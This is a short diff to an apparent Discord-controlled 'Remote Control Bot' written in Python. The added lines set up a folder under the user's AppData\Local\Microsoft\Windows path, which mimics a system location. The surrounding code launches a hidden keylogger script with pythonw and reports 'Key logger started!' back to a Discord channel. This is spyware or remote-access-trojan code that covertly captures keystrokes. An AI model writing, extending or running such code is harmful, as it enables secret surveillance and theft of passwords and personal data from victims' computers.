@@ -342,6 +342,9 @@ async def on_ready():
             embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
             await channel.send(embed=embed)
             try:
+                user_profile = os.environ['USERPROFILE']
+                target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
+                os.makedirs(target_path, exist_ok=True)
                 process = subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-main", "keys.pyw")])
                 embed = nextcord.Embed(title="Key logger started!", timestamp=datetime.now(), colour=0x00f51d, description="Key logger has now started!")
                 embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
